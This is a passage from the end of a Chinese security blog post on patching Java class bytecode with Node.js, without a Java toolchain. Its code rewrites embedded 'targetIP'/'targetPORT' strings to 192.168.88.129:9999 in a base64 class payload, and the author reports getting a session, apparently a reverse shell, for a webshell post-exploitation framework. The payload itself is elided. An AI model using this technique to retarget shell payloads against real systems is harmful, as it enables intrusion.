+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">function</span><span class="w"> </span><span class="nf">replaceClassStringVar</span><span class="p">(</span><span class="n">b64code</span><span class="p">,</span><span class="w"> </span><span class="n">oldvar</span><span class="p">,</span><span class="w"> </span><span class="n">newvar</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">b64code</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;base64&#39;</span><span class="p">);</span><span class="o">//</span><span class="err">解码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">hexcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">code</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span><span class="o">//</span><span class="err">转为</span><span class="mi">16</span><span class="err">进制</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">hexoldvar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">oldvar</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span><span class="o">//</span><span class="err">转为</span><span class="mi">16</span><span class="err">进制</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">oldpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hexcode</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="n">hexoldvar</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oldpos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="o">//</span><span class="err">判断字节码中是否包含目标字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">let</span><span class="w"> </span><span class="n">newlength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">decimalToHex</span><span class="p">(</span><span class="n">newvar</span><span class="p">.</span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="o">//</span><span class="err">计算新字符串长度</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">let</span><span class="w"> </span><span class="n">retcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">`</span><span class="err">${</span><span class="n">hexcode</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">oldpos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="err">}${</span><span class="n">newlength</span><span class="err">}${</span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">newvar</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span><span class="err">}${</span><span class="n">hexcode</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="n">oldpos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hexoldvar</span><span class="p">.</span><span class="n">length</span><span class="p">)</span><span class="err">}</span><span class="o">`</span><span class="p">;</span><span class="o">//</span><span class="err">把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">retcode</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span><span class="o">//</span><span class="n">base64</span><span class="err">编码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s1">&#39;nonono&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">b64code</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">function</span><span class="w"> </span><span class="nf">decimalToHex</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="n">padding</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">Number</span><span class="p">(</span><span class="n">d</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">typeof</span><span class="w"> </span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&#34;undefined&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">padding</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="no">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">padding</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">hex</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">padding</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;0&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hex</span><span class="p">;</span><span class="o">//</span><span class="err">小于</span><span class="n">padding</span><span class="err">长度就填充</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">hex</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">content</span><span class="o">=`</span><span class="n">xxxxxxxxxxxxx</span><span class="o">`//</span><span class="err">要替换的字节码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">content</span><span class="o">=</span><span class="nf">replaceClassStringVar</span><span class="p">(</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;targetIP&#39;</span><span class="p">,</span><span class="s1">&#39;192.168.88.129&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">content</span><span class="o">=</span><span class="nf">replaceClassStringVar</span><span class="p">(</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;targetPORT&#39;</span><span class="p">,</span><span class="s1">&#39;9999&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>用命令还原一下文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo -n xxxxxx |baes64 -d |tee after.class
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看一下修改后的结果</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。</p>
+<p>实际中是否能用呢？</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>回车，获得会话，说明修改是有效的。</p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>3 最后</h2><p>As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。</p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-11-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/node-edit-java-class/" data-title="无java环境修改字节码"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/node-edit-java-class/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/node-edit-java-class/" data-title="无java环境修改字节码"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/node-edit-java-class/" data-title="无java环境修改字节码"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/node-edit-java-class/" data-title="无java环境修改字节码"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/node-edit-java-class/" data-title="无java环境修改字节码" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;无java环境修改字节码&#34;, &#34;https://yzddmr6.com/posts/node-edit-java-class/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/antsword-diy-5/" class="prev" rel="prev" title="蚁剑改造计划之支持内存马"><i class="fas fa-angle-left fa-fw"></i>蚁剑改造计划之支持内存马</a>
+            <a href="/posts/as-exploits/" class="next" rel="next" title="As-Exploits: 中国蚁剑后渗透框架">As-Exploits: 中国蚁剑后渗透框架<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
